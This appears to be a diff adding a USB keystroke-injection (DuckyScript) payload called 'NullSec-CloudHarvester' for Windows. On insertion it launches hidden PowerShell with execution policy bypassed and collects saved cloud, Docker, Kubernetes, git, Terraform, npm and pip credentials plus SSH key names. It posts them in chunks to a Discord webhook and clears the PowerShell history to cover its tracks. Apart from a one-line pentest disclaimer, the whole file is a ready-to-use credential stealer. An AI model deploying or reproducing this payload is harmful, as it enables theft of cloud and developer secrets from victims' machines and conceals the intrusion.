@@ -1,0 +1,121 @@
+REM ################################################
+REM # NullSec-CloudHarvester                       #
+REM # Cloud Service Credential & Config Extractor   #
+REM # Target: Windows 10/11                         #
+REM # Author: NullSec (github.com/bad-antics)       #
+REM ################################################
+REM
+REM Extracts saved cloud CLI credentials and configs:
+REM - AWS CLI credentials & config
+REM - Azure CLI tokens & profiles  
+REM - Google Cloud SDK configs
+REM - Docker configs & registries
+REM - Kubernetes configs
+REM - Terraform state references
+REM - SSH keys inventory
+REM - Git credentials
+REM
+REM Exfiltration: Discord Webhook (configure below)
+REM For authorized penetration testing only.
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+
+REM === CONFIGURE YOUR WEBHOOK HERE ===
+STRING $wh='YOUR_DISCORD_WEBHOOK_URL';
+ENTER
+
+STRING $r=@();$u=$env:USERPROFILE;$h=$env:COMPUTERNAME;
+ENTER
+
+REM --- AWS Credentials ---
+STRING $awsCred="$u\.aws\credentials";$awsConf="$u\.aws\config";
+ENTER
+STRING if(Test-Path $awsCred){$r+="=== AWS CREDENTIALS ===`n"+(gc $awsCred -Raw)}
+ENTER
+STRING if(Test-Path $awsConf){$r+="=== AWS CONFIG ===`n"+(gc $awsConf -Raw)}
+ENTER
+
+REM --- Azure CLI ---
+STRING $azDir="$u\.azure";
+ENTER
+STRING if(Test-Path "$azDir\azureProfile.json"){$r+="=== AZURE PROFILE ===`n"+(gc "$azDir\azureProfile.json" -Raw)}
+ENTER
+STRING if(Test-Path "$azDir\clouds.config"){$r+="=== AZURE CLOUDS ===`n"+(gc "$azDir\clouds.config" -Raw)}
+ENTER
+
+REM --- Google Cloud ---
+STRING $gDir="$env:APPDATA\gcloud";
+ENTER
+STRING if(Test-Path "$gDir\credentials.db"){$r+="=== GCLOUD CREDS DB EXISTS ===`nPath: $gDir\credentials.db"}
+ENTER
+STRING if(Test-Path "$gDir\properties"){$r+="=== GCLOUD PROPERTIES ===`n"+(gc "$gDir\properties" -Raw)}
+ENTER
+STRING if(Test-Path "$gDir\application_default_credentials.json"){$r+="=== GCLOUD ADC ===`n"+(gc "$gDir\application_default_credentials.json" -Raw)}
+ENTER
+
+REM --- Docker ---
+STRING $dk="$u\.docker\config.json";
+ENTER
+STRING if(Test-Path $dk){$r+="=== DOCKER CONFIG ===`n"+(gc $dk -Raw)}
+ENTER
+
+REM --- Kubernetes ---
+STRING $kc="$u\.kube\config";
+ENTER
+STRING if(Test-Path $kc){$r+="=== KUBECONFIG ===`n"+(gc $kc -Raw)}
+ENTER
+
+REM --- SSH Keys Inventory ---
+STRING $sshDir="$u\.ssh";
+ENTER
+STRING if(Test-Path $sshDir){$keys=gci $sshDir -File|%{$_.Name};$r+="=== SSH KEYS ===`n"+($keys-join"`n")}
+ENTER
+
+REM --- Git Credentials ---
+STRING $gitCred="$u\.git-credentials";
+ENTER
+STRING if(Test-Path $gitCred){$r+="=== GIT CREDENTIALS ===`n"+(gc $gitCred -Raw)}
+ENTER
+STRING $gitConf="$u\.gitconfig";
+ENTER
+STRING if(Test-Path $gitConf){$r+="=== GITCONFIG ===`n"+(gc $gitConf -Raw)}
+ENTER
+
+REM --- Terraform ---
+STRING $tfrc="$u\.terraformrc";$tfCred="$env:APPDATA\terraform.d\credentials.tfrc.json";
+ENTER
+STRING if(Test-Path $tfrc){$r+="=== TERRAFORMRC ===`n"+(gc $tfrc -Raw)}
+ENTER
+STRING if(Test-Path $tfCred){$r+="=== TERRAFORM CREDS ===`n"+(gc $tfCred -Raw)}
+ENTER
+
+REM --- npm/pip tokens ---
+STRING $npmrc="$u\.npmrc";
+ENTER
+STRING if(Test-Path $npmrc){$r+="=== NPMRC ===`n"+(gc $npmrc -Raw)}
+ENTER
+STRING $pipConf="$env:APPDATA\pip\pip.ini";
+ENTER
+STRING if(Test-Path $pipConf){$r+="=== PIP CONFIG ===`n"+(gc $pipConf -Raw)}
+ENTER
+
+REM --- Exfiltrate ---
+STRING $out="Cloud Harvest [$h] User: $env:USERNAME`n"+($r-join"`n---`n");
+ENTER
+STRING $chunks=[math]::Ceiling($out.Length/1900);
+ENTER
+STRING for($i=0;$i -lt $chunks;$i++){$chunk=$out.Substring($i*1900,[math]::Min(1900,$out.Length-$i*1900));
+ENTER
+STRING $body=@{content="``````$chunk``````"}|ConvertTo-Json;
+ENTER
+STRING irm $wh -Method Post -Body $body -ContentType 'application/json' -ea SilentlyContinue}
+ENTER
+
+REM --- Cleanup ---
+STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -ea SilentlyContinue;exit
+ENTER
